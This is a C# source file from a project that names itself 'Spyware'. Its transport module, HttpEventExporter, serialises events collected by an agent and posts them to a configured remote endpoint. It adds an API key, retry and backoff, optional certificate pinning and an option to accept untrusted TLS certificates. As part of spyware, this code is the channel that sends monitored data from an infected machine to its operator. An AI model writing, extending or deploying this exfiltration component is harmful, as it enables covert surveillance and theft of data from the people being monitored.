using System.Net;
using System.Net.Http.Headers;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.Json;
using Spyware.Core.Configuration;
using Spyware.Core.Logging;

namespace Spyware.Transport;

/// <summary>Opcional (Mode = "http" o "both"). Con reintentos y backoff.</summary>
public sealed class HttpEventExporter : IEventExporter, IDisposable
{
    private static readonly JsonSerializerOptions Options = new()
    {
        DefaultIgnoreCondition = System.Text.Json.Serialization.JsonIgnoreCondition.WhenWritingNull
    };

    private readonly HttpClient _client;
    private readonly TransportSection _config;
    private readonly RetryPolicy _retry;
    private readonly ILog _log;

    public string Name => "http";

    public HttpEventExporter(TransportSection config, ILog log)
    {
        _config = config;
        _log = log;
        _retry = new RetryPolicy(config.RetryMinutes);

        var handler = new HttpClientHandler
        {
            ServerCertificateCustomValidationCallback = ValidateCertificate
        };

        _client = new HttpClient(handler)
        {
            Timeout = TimeSpan.FromSeconds(Math.Max(5, config.TimeoutSeconds))
        };

        if (!string.IsNullOrWhiteSpace(config.ApiKey))
            _client.DefaultRequestHeaders.TryAddWithoutValidation("X-Api-Key", config.ApiKey);
    }

    public bool Export(string agentId, IReadOnlyList<IReadOnlyDictionary<string, object?>> events)
    {
        if (events.Count == 0) return true;

        string payload = JsonSerializer.Serialize(new
        {
            agent_id = agentId,
            generated_at_utc = DateTime.UtcNow.ToString("o"),
            count = events.Count,
            events
        }, Options);

        for (int attempt = 1; attempt <= _retry.MaxAttempts; attempt++)
        {
            try
            {
                using var request = new HttpRequestMessage(HttpMethod.Post, _config.Endpoint);
                request.Content = new StringContent(payload, Encoding.UTF8, "application/json");
                request.Headers.Accept.Add(new MediaTypeWithQualityHeaderValue("application/json"));

                using HttpResponseMessage response = _client.Send(request);

                if (response.IsSuccessStatusCode)
                {
                    _log.Info($"HTTP OK ({(int)response.StatusCode}) con {events.Count} eventos.");
                    return true;
                }

                _log.Warn($"HTTP {(int)response.StatusCode} en el intento {attempt}/{_retry.MaxAttempts}.");

                if ((HttpStatusCode)(int)response.StatusCode is HttpStatusCode.BadRequest or HttpStatusCode.Unauthorized)
                    return false;
            }
            catch (TaskCanceledException ex)
            {
                _log.Warn($"Timeout HTTP en el intento {attempt}: {ex.Message}");
            }
            catch (Exception ex)
            {
                _log.Warn($"HTTP falló en el intento {attempt}: {ex.Message}");
            }

            if (attempt < _retry.MaxAttempts)
                Thread.Sleep(_retry.GetDelay(attempt));
        }

        return false;
    }

    private bool ValidateCertificate(HttpRequestMessage message, X509Certificate2? certificate, X509Chain? chain, SslPolicyErrors errors)
    {
        if (errors == SslPolicyErrors.None)
        {
            if (!string.IsNullOrWhiteSpace(_config.ExpectedCertificateThumbprint) &&
                certificate is not null &&
                !string.Equals(certificate.Thumbprint, _config.ExpectedCertificateThumbprint, StringComparison.OrdinalIgnoreCase))
            {
                _log.Warn("El thumbprint del servidor no coincide con el esperado (pinning).");
                return false;
            }

            return true;
        }

        if (_config.AllowUntrustedTlsCertificate)
        {
            _log.Warn($"TLS con advertencias aceptado por configuración: {errors}");
            return true;
        }

        _log.Warn($"TLS rechazado: {errors}");
        return false;
    }

    public void Dispose() => _client.Dispose();
}
